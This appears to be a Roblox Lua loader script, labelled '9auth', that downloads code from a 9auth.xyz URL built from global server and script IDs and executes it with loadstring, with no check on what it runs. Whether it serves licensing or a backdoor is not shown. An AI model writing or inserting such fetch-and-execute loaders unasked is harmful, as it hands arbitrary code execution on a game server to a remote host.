local HttpService = game:GetService("HttpService")
local serverId    = _G.AUTH_SERVER_ID
local scriptId    = _G.AUTH_SCRIPT_ID


local function safeGet(url, encode)
    local ok, result = pcall(function()
        return HttpService:GetAsync(url, encode)
    end)
    if ok then
        return result
    else
        warn("[9auth] HTTP request failed:", result)
        return nil
    end
end


local scriptUrl = ("https://9auth.xyz/loader/%s/%s"):format(serverId, scriptId)
local payload = safeGet(scriptUrl, true)
if not payload then
    warn("[9auth] Failed to download auth helper script.")
    return
end


local fn, err = loadstring(payload)
if not fn then
    warn("[9auth] Error compiling payload:", err)
    return
end

local ok, err2 = pcall(fn)
if not ok then
    warn("[9auth] Error running payload:", err2)
end
